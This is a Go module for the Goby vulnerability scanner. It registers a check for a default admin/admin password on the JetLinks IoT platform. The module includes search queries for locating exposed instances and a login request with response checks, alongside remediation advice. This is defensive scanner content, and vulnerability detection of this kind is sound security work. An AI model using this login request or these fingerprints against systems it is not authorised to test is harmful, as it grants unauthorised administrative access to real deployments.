package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "JetLinks login Api Default Password Vulnerability",
    "Description": "<p>Jetlinks open source Internet of things platform is based on Java 8 and spring boot 2 x，WebFlux，Netty，Vert. x. Developed by reactor and others, it is an enterprise level Internet of things basic platform that can be used out of the box and secondary development.</p><p>User name admin password admin</p>",
    "Impact": "<p>JetLinks Default password</p>",
    "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "Product": "JetLinks",
    "VulType": [
        "Default Password"
    ],
    "Tags": [
        "Default Password"
    ],
    "Translation": {
        "CN": {
            "Name": "JetLinks login 接口默认密码漏洞",
            "Product": "JetLinks",
            "Description": "<p>JetLinks开源物联网平台基于Java8，Spring Boot 2.x，WebFlux，Netty，Vert.x，Reactor等开发，是一个开箱即用，可二次开发的企业级物联网基础平台。<code></code></p><p>用户名admin密码admin</p>",
            "Recommendation": "<p>1、修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位。</p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Impact": "<p>JetLinks开源物联网平台基于Java8，Spring Boot 2.x，WebFlux，Netty，Vert.x，Reactor等开发，是一个开箱即用，可二次开发的企业级物联网基础平台。</p><p>用户名admin密码admin</p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "JetLinks login Api Default Password Vulnerability",
            "Product": "JetLinks",
            "Description": "<p>Jetlinks open source Internet of things platform is based on Java 8 and spring boot 2 x，WebFlux，Netty，Vert. x. Developed by reactor and others, it is an enterprise level Internet of things basic platform that can be used out of the box and secondary development.</p><p>User name admin password admin</p>",
            "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
            "Impact": "<p>JetLinks Default password</p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "FofaQuery": "title=\"JetLinks\"|| body=\"/liveqing/liveplayer-element.min.js\"",
    "GobyQuery": "title=\"JetLinks\"|| body=\"/liveqing/liveplayer-element.min.js\"",
    "Author": "xiaodan",
    "Homepage": "https://www.jetlinks.cn/",
    "DisclosureDate": "2022-03-30",
    "References": [
        "https://fofa.so/"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "1",
    "CVSS": "5",
    "CVEIDs": [],
    "CNVD": [
        "CNVD-2021-49115"
    ],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/jetlinks/authorize/login",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/json;charset=UTF-8"
                },
                "data_type": "text",
                "data": "{\"username\":\"admin\",\"password\":\"admin\",\"expires\":3600000,\"tokenType\":\"default\",\"verifyKey\":\"\",\"verifyCode\":\"\"}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"expires\":3600000,",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/jetlinks/authorize/login",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/json;charset=UTF-8"
                },
                "data_type": "text",
                "data": "{\"username\":\"admin\",\"password\":\"admin\",\"expires\":3600000,\"tokenType\":\"default\",\"verifyKey\":\"\",\"verifyCode\":\"\"}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"expires\":3600000,",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10369"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
